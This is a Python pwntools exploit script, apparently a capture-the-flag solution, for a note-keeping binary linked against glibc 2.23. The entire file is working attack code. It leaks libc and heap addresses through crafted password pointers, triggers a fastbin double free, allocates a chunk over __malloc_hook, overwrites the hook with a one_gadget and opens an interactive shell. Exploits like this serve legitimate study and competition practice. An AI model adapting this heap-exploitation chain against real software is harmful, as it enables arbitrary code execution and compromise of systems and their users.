from pwn import *

e = ELF("./secretnote_patched")
libc = ELF("./libc6_2.23-0ubuntu11.3_amd64.so")
ld = ELF("./ld-2.23.so")
context.binary = e

p_s = lambda data: p.send(data)
p_sa = lambda msg, data: p.sendafter(msg, data)
p_sl = lambda data: p.sendline(data)
p_sla = lambda msg, data: p.sendlineafter(msg, data)
p_recvut = lambda msg: p.recvuntil(msg)
debug = lambda : gdb.attach(p, gdbscript = script)

def create(username, password):
    p_sa(b"Quit\n>> ", b"1")
    p_sla(b"username: ", username)
    p_sla(b"password: ", password)

def edit(index, username, pwlen, password):
    p_sa(b"Quit\n>> ", b"2")
    p_sa(b"index: ", f"{index}".encode())
    p_sla(b"username: ", username)
    p_sa(b"pwLen: ", f"{pwlen}".encode())
    p_sla(b"password: ", password)

def delete(index):
    p_sa(b"Quit\n>> ", b"3")
    p_sa(b"index: ", f"{index}".encode())

def show(index):
    p_sa(b"Quit\n>> ", b"4")
    p_sa(b"index: ", f"{index}".encode())

'''
switch case in main
'''

script = '''
b *0x0000000000401DD1
'''

p = process("./secretnote_patched")
#p = gdb.debug("./secretnote_patched", gdbscript = script)

# leak libc
read_got = e.got['read']
create(b"0" * 79, b"1" * 0x8 + p64(read_got))
show(0)
p_recvut(b"password : ")
libc_base = u64(p.recv(6).ljust(8, b"\x00")) - libc.symbols['read']
print(hex(libc_base))

# leak heap 
table = 0x404040
create(b"2" * 79, b"3" * 0x8 + p64(table))
show(1)
p_recvut(b"password : ")
heap_base = u64(p.recvline()[:-1:].ljust(8, b"\x00")) - 0x1040
print(hex(heap_base))

# trigger double free
## make 2 same ptr point to chunk index 2
create(b"4" * 8, b"5" * 8)
create(b"6" * 79, b"7" * 0x8 + p64(heap_base + 0x1160))
## now password ptr of index 3 and chunk ptr of index 2 are the same

delete(3)
delete(2)
## [fast bin 0x70]: chunk_2 -> chunk_3 -> chunk_2

# malloc to [__malloc_hook - 0x23]
__malloc_hook = libc_base + libc.symbols['__malloc_hook']
create(p64(__malloc_hook - 0x23), b"9" * 0x8)
create(b"A" * 8, b"B" * 8)
create(b"C" * 8, b"D" * 8)

#debug()

## overwrite __malloc_hook with one_gadget
one_shot = libc_base + 0xf1247
create(b"E" * 0x13 + p64(one_shot), b"F" * 8)

# trigger
create(b"G" * 8, b"H" * 8)

p.interactive()